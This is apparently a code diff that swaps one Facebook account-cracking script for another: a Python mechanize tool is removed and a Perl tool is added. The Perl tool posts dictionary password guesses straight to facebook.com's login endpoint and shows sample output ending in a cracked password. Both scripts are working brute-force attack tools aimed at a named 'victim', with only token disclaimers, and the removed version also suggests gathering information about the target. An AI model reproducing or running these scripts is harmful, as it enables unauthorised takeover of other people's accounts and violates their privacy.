@@ -1,122 +1,131 @@
-<pre class="ndfHFb-c4YZDc-fmcmS-DARUcf">#!usr/bin/python
-#Facebook Cracker Version 2 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
-#This program is for educational purposes only.
-#Don't attack people facebook accounts it's illegal ! 
-#If you want to crack into someone's account, you must have the permission of the user. 
-#InfosecHacker is not responsible.
+#!/usr/bin/perl
+#
+# Bruteforce-Facebook
+#
+# Description:
+# Imad'Ox and Black cat Cracker TooL is a password cracking tool written in perl to perform a dictionary-based attack on a specific Facebook user through HTTPS.
+#
+# Usage:
+# perl face.pl login wordlist
+# login could be either a user's email address or profile name
+#
+# Module Requirements:
+#
+# Install module if missing:
+# perl -MCPAN -e 'install Net::SSLeay'
+#
+# Demo:
+# perl face.pl Facebooklogin@facebook.com wordlist.lst
+#
+# --- Face-Bruter Facebook password cracking tool
+# --- By Black Cat XIII && Imad'Ox
+# --- www.facebook.com/imad.elouajib
+# --- www.facebook.com/yousef.mhamdi.007
+#
+# [+] Cracking Facebooklogin@facebook.com ...
+#
+# [-] test -> Failed
+# [-] test123 -> Failed
+# [-] testtest -> Failed
+# [-] testest123 -> Failed
+# [-] qwerty -> Failed
+# [-] azerty -> Failed
+# [-] password -> Failed
+# [-] password123 -> Failed
+#
+########################################################
+# [+] CRACKED! Your password is P@$$W0RD
+########################################################
+#
+
+use strict;
+use Net::SSLeay::Handle;
+
+if(!defined($ARGV[0] && $ARGV[1])) {
+
+system('clear');
+print "\n          +--------------------------------------------------------------+\n";
+print "          |          +++ Face-Bruter Facebook Password Bruter            |\n";
+print "          |          +++ Coded by Imad 'Ox && Modified by Black Cat      |\n";
+print "          |          +++ www.facebook.com/yousef.mhamdi.007              |\n";
+print "          |          +++ www.facebook.com/imad.elouajib                  |\n";
+print "          |          +++ Usage: perl $0 login wordlist                   |\n";
+print "          +--------------------------------------------------------------+\n\n";
+exit; }
+
+my $user = $ARGV[0];
+my $wordlist = $ARGV[1];
+
+open (LIST, $wordlist) || die "\n[-] No Wordlist On $wordlist -_- \n";
+
+print "\n          +--------------------------------------------------------------+\n";
+print "          |          +++ Face-Bruter Facebook Password Bruter            |\n";
+print "          |          +++ Coded by Imad 'Ox && Modified by Black Cat      |\n";
+print "          |          +++ www.facebook.com/yousef.mhamdi.007              |\n";
+print "          |          +++ www.facebook.com/imad.elouajib                  |\n";
+print "          +--------------------------------------------------------------+\n\n";
+print "\n          [+] Now Cracking $user ...\n\n";
+
+while (my $password = <LIST>) {
+chomp ($password);
+$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
+
+my $a = "POST /login.php HTTP/1.1";
+my $b = "Host: www.facebook.com";
+my $c = "Connection: close";
+my $e = "Cache-Control: max-age=0";
+my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+my $g = "Origin: https://www.facebook.com";
+my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
+my $i = "Content-Type: application/x-www-form-urlencoded";
+my $j = "Accept-Encoding: gzip,deflate,sdch";
+my $k = "Accept-Language: en-US,en;q=0.8";
+my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";
+
+my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
+my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
+my $cl = length($post);
+my $d = "Content-Length: $cl";
 
 
-import sys
-import random
-import mechanize
-import cookielib
+my ($host, $port) = ("www.facebook.com", 443);
+
+tie(*SSL, "Net::SSLeay::Handle", $host, $port);
 
 
-GHT = '''
-        +=========================================+
-        |..........Facebook Cracker v 2...........|
-        +-----------------------------------------+
-        |#Author: InfoSecHacker          |
-        |#Contact: www.twitter.com/abhishekmani002|
-        |#Date: 23/10/2015                        |
-        |#This tool is made for pentesting.       |
-        |#Changing the Description of this tool   |
-        |Won't made you the coder ^_^ !!!         |
-        |#Respect Coderz ^_^                      |
-        |#I take no responsibilities for the      |
-        |  use of this program !                  |
-        +=========================================+
-        |..........Facebook Cracker v 2...........|
-        +-----------------------------------------+
-'''
-print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
-print "# Hit CTRL+C to quit the program"
-print "# Use www.graph.facebook.com for more infos about your victim ^_^"
+print SSL "$a\n";
+print SSL "$b\n";
+print SSL "$c\n";
+print SSL "$d\n";
+print SSL "$e\n";
+print SSL "$f\n";
+print SSL "$g\n";
+print SSL "$h\n";
+print SSL "$i\n";
+print SSL "$j\n";
+print SSL "$k\n";
+print SSL "$l\n";
+print SSL "$cookie\n\n";
 
+print SSL "$post\n";
 
-email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
-passwordlist = str(raw_input("Enter the name of the password list file : "))
-
-useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-
-
-login = 'https://www.facebook.com/login.php?login_attempt=1'
-def attack(password):
-
-  try:
-     sys.stdout.write("\r[*] trying %s.. " % password)
-     sys.stdout.flush()
-     br.addheaders = [('User-agent', random.choice(useragents))]
-     site = br.open(login)
-     br.select_form(nr=0)
-
-      
-         
-     ##Facebook
-     br.form['email'] =email
-     br.form['pass'] = password
-     br.submit()
-     log = br.geturl()
-     if log == login:
-        print "\n\n\n [*] Password found .. !!"
-        print "\n [*] Password : %s\n" % (password)
-        sys.exit(1)
-  except KeyboardInterrupt:
-        print "\n[*] Exiting program .. "
-        sys.exit(1)
-
-def search():
-    global password
-    for password in passwords:
-        attack(password.replace("\n",""))
-
-
-
-def check():
-
-    global br
-    global passwords
-    try:
-       br = mechanize.Browser()
-       cj = cookielib.LWPCookieJar()
-       br.set_handle_robots(False)
-       br.set_handle_equiv(True)
-       br.set_handle_referer(True)
-       br.set_handle_redirect(True)
-       br.set_cookiejar(cj)
-       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    except KeyboardInterrupt:
-       print "\n[*] Exiting program ..\n"
-       sys.exit(1)
-    try:
-       list = open(passwordlist, "r")
-       passwords = list.readlines()
-       k = 0
-       while k &lt; len(passwords):
-          passwords[k] = passwords[k].strip()
-          k += 1
-    except IOError:
-        print "\n [*] Error: check your password list path \n"
-        sys.exit(1)
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        sys.exit(1)
-    try:
-        print GHT
-        print " [*] Account to crack : %s" % (email)
-        print " [*] Loaded :" , len(passwords), "passwords"
-        print " [*] Cracking, please wait ..."
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        sys.exit(1)
-    try:
-        search()
-        attack(password)
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        sys.exit(1)
-
-if __name__ == '__main__':
-    check()
-</pre>
+my $success;
+while(my $result = <SSL>){
+if($result =~ /Location(.*?)/){
+$success = $1;
+}
+}
+if (!defined $success)
+{
+print "[-] $password -> Not Him :( \n";
+close SSL;
+}
+else
+{
+print "\n########################################################\n";
+print "[+] Yuuup!! Pass Cracked => Pass is $password :D\n";
+print "########################################################\n\n";
+close SSL;
+exit;
+}
+}
